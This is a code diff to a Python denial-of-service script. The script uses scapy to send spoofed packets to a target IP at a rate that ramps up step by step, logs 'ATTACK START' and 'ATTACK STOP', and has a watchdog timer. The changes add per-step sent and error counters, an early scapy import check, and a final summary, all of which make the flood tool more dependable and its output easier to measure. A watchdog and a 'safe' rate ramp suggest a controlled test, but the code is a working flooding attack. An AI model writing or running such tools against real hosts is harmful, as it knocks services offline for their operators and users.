@@ -121,15 +121,22 @@ def _build_packet(dst_ip: str):
 
 
 def run_flood(target_ip: str, iface: str, rate: float,
-              stop_event) -> None:
-    """Send spoofed packets at `rate` pkt/s until stop_event is set."""
+              stop_event, counters: dict) -> None:
+    """Send spoofed packets at `rate` pkt/s until stop_event is set.
+
+    Thread-safe packet counters are written to `counters`:
+      counters['sent']   — total packets handed to sendp()
+      counters['errors'] — total sendp() exceptions
+    """
     from scapy.all import sendp  # type: ignore[import]
     interval = 1.0 / rate
     while not stop_event.is_set():
         pkt = _build_packet(target_ip)
         try:
             sendp(pkt, iface=iface, verbose=False)
+            counters['sent'] += 1
         except Exception as exc:
+            counters['errors'] += 1
             log.error("sendp error: %s", exc)
             break
         time.sleep(interval)
@@ -193,10 +200,25 @@ def main() -> int:
     watchdog = start_watchdog(duration)
     log.info("Watchdog armed for %d seconds.", duration)
 
+    # ── Early import check — fail fast and visibly if scapy is missing ───────
+    # Without this, the ImportError happens silently inside a daemon thread,
+    # main() exits rc=0, and zero packets were ever sent.
+    try:
+        from scapy.all import Ether, IP, UDP, Raw, sendp  # noqa: F401
+        log.info("scapy import OK")
+    except ImportError as exc:
+        log.error("DEPENDENCY ERROR: scapy not available — %s", exc)
+        log.error("Install with: pip3 install scapy --break-system-packages")
+        return 3
+
     # ── Attack start ──────────────────────────────────────────────────────────
     import threading
     stop_event = threading.Event()
     attack_start = datetime.now(timezone.utc).isoformat()
+    # Per-step and total counters (plain dicts; GIL makes int ops safe enough here)
+    step_counters: list[dict] = []
+    total_sent   = 0
+    total_errors = 0
     log.info("=" * 60)
     log.info("ATTACK START  %s", attack_start)
     log.info("  Target IP       : %s", target)
@@ -219,19 +241,23 @@ def main() -> int:
             log.info("RAMP STEP — setting rate to %.0f pkt/s  (target=%s)",
                      rate, target)
 
-            # Stop previous flood thread if running
+            # Snapshot previous thread's counters before stopping it
             if flood_thread and flood_thread.is_alive():
                 stop_event.set()
                 flood_thread.join(timeout=3)
                 stop_event.clear()
 
+            counters: dict = {'sent': 0, 'errors': 0, 'rate': rate}
+            step_counters.append(counters)
+
             flood_thread = threading.Thread(
                 target=run_flood,
-                args=(target, iface, rate, stop_event),
+                args=(target, iface, rate, stop_event, counters),
                 daemon=True,
                 name=f"flood-{int(rate)}",
             )
             flood_thread.start()
+            log.info("  flood thread started (rate=%.0f, iface=%s)", rate, iface)
             # Hold this rate for ramp_interval seconds before safe_rate_ramp
             # yields the next step (the sleep is inside safe_rate_ramp itself)
 
@@ -252,11 +278,30 @@ def main() -> int:
         if flood_thread and flood_thread.is_alive():
             flood_thread.join(timeout=5)
         watchdog.cancel()
-        attack_stop = datetime.now(timezone.utc).isoformat()
-        log.info("ATTACK STOP   %s", attack_stop)
-        log.info("Results written to: %s", LOG_FILE)
 
-    return 0
+        # Tally totals across all rate steps
+        total_sent   = sum(c['sent']   for c in step_counters)
+        total_errors = sum(c['errors'] for c in step_counters)
+
+        attack_stop = datetime.now(timezone.utc).isoformat()
+        log.info("=" * 60)
+        log.info("ATTACK STOP   %s", attack_stop)
+        log.info("  Target IP       : %s", target)
+        log.info("  Interface       : %s", iface)
+        log.info("  Rate ramp       : %d → %d pkt/s  step=%d",
+                 args.start_rate, args.max_rate, args.step)
+        log.info("  Steps run       : %d", len(step_counters))
+        log.info("  Total sent      : %d packets", total_sent)
+        log.info("  Total errors    : %d", total_errors)
+        if total_sent == 0 and step_counters:
+            log.error("  *** WARNING: ZERO packets sent — check scapy/interface. ***")
+        for sc in step_counters:
+            log.info("    rate=%-6.0f  sent=%-8d  errors=%d",
+                     sc['rate'], sc['sent'], sc['errors'])
+        log.info("  Log file        : %s", LOG_FILE)
+        log.info("=" * 60)
+
+    return 0 if total_errors == 0 else 1
 
 
 if __name__ == "__main__":
